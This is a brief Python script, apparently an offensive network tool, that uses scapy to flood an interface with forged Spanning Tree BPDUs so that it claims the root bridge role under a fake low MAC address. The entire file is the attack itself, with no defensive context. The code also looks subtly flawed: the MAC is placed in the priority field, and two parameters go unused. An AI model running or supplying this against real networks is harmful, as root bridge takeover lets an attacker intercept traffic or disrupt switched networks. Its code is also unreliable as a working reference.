#!/usr/bin/env python3
from scapy.all import *
from scapy.layers.l2 import STP

def run_stp_manip(interface, target=None, duration=60, count=1000):
    print(f"[+] Manipulating STP on {interface} - claiming root bridge")
    root_mac = "00:11:22:33:44:55"  # Fake root MAC (lower than real)
    for _ in range(count):
        stp_pkt = Ether(dst="01:80:c2:00:00:00") / STP(proto=0, version=0, type=0, flags=0x01, rootid=root_mac, rootcost=0, portid=0x8001, msgage=0, maxage=20, hellotime=2, fwddelay=15)
        sendp(stp_pkt, iface=interface, inter=0.1)
    print("[+] STP manipulation sent.")
